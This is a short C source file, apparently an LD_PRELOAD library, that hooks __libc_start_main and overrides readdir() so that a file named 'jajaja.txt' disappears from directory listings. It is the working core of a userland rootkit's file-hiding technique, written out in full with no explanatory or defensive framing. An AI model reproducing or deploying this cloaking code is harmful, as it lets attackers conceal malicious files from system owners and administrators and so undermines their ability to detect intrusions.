#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

struct dirent * (*real_readdir) (DIR*);
const char* cloaked_file = "jajaja.txt";

int __libc_start_main(
	int (*main) (int, char **, char **),
	int argc, char **ubp_av,
	void (*init) (void),
	void (*fini) (void),
	void (*rtld_fini) (void),
	void (* stack_end))
{
	// Get the address of the real readdir()
	real_readdir = dlsym(RTLD_NEXT, "readdir");
	int (*real__libc_start_main)(
		int (*main) (int, char **, char **),
		int argc, char **ubp_av,
		void (*init) (void),
		void (*fini) (void),
		void (*rtld_fini) (void),
		void (* stack_end)
	) = dlsym(RTLD_NEXT, "__libc_start_main");
	return real__libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}

// Overrides the real readdir()
struct dirent *readdir(DIR *dirp)
{
	struct dirent *ep = real_readdir(dirp);
	if (ep != NULL && strcmp(ep->d_name, cloaked_file) == 0)
		return real_readdir(dirp);
	return ep;
}